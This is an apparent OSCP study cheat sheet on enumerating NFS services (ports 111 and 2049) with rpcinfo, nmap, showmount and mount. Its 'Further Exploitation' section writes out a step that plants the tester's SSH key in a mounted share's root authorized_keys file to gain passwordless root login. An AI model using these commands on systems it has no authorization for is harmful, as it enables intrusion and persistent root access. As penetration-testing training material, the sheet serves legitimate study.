# NFS Enumeration (Port 111, 2049)

## Quick Intro

* Developed in 1984 by Sun Microsystems
* Common ports used by NFS are **port 111 and 2049 tcp/udp**
* It is a client/server system that allows users to access files across a network and treat them as if they were in a local file directory.

## First steps

1. rpcinfo: `rpcinfo -p <target-ip>` to list all registered RPC programs, versions, and ports.

2. nmap: `nmap -p 111 -sV -sC <target-ip>` to script-scan and detect service versions attached to the portmapper.

3. showmount: `showmount -e <target-ip>` to see available NFS export lists if NFS is mapped.

## Identifying if NFS is in use

```
rpcinfo -p <ip>

# If 111 and 2049 are listed , then shares are enabled and we can mount them
```

## Show all mounts

* if nfs is available, use **showmount** to view available mounting points

```
showmount -e $ip
```

## Mount an NFS share

* mount the file system with the **mount** command and interact with remote system
* first create the directory for mounting -

  `mkdir /mnt/nfs`

```
mount -t nfs $ip:/share /mnt/nfs
```

## Unmounting the shares

```
umount -f -l /mnt/nfs
# -f – Force unmount (in case of an unreachable NFS system). (Requires kernel 2.1.116 or later.)
# -l – Lazy unmount. Detach the filesystem from the filesystem hierarchy now, and cleanup all references to the filesystem as soon as it is not busy anymore. (Requires kernel 2.4.11 or later.)
```

## Permission Denied ?

{% embed url="<https://blog.christophetd.fr/write-up-vulnix/>" %}

## Further Exploitation

* **If you can write to the remote hosts, try to put ssh key there** so that we can get remote ssh without password ,

```
ssh keygen
# Generating ssh keys

cat ~/.ssh/id_rsa.pub >> /mnt/nfs/root/.ssh/authorized_keys
# Putting it to remote host

ssh root@$ip
# Now we can login without password on target
```

## Nmap Scan on RPCbind and NFS

```
nmap -v -p 111 10.11.1.1-254

nmap -sV -p 111 --script=rpcinfo 10.11.1.1-254

nmap -p 111 --script nfs* 10.11.1.72
```

Source: https://gabb4r.gitbook.io/oscp-notes/service-enumeration/nfs-enumeration-port-111-2049
